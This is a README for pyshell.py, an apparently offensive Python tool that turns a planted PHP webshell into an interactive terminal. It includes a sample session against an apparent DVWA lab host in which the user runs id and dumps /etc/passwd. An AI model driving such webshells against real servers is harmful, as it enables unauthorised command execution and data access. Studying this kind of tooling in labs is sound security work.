# pyshell.py

## Description
A Python script that connects to a webshell to create a sudo-interactive terminal session.

```
usage: pyshell.py [-h] -u URL -m {GET,POST}

A Python script that connects to a webshell to create a sudo-interactive
terminal session.

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     The URL to connect to your webshell. This script
                        will append your commands to the supplied string.
                        For example,
                        http://windowsforensics.net?cmd=\{Command\}.
  -m {GET,POST}, --method {GET,POST}
                        The HTTP Request Method to use when interacting
                        with your webshell.
```

## Requirements
- Python ≥ 3.0

## Usage
- Download the pyshell repository: `git clone https://github.com/malwaredetective/pyshell.git`.
- Execute **pyshell.py** within your terminal: `python3 pyshell.py -u <string> -m <string>` to interact with your webshell in a sudo-interactive terminal session.

```
Kyle@KHUB-LAPTOP Documents\Python\pyshell via 🐍 v3.10.10
❯ python .\pyshell.py -u "http://dvwa.local/shell.php?cmd=" -m "GET"

www-data@ip-10-10-36-58
--> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@ip-10-10-36-58
--> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:106:111:MySQL Server,,,:/nonexistent:/bin/false

www-data@ip-10-10-36-58
--> exit
```
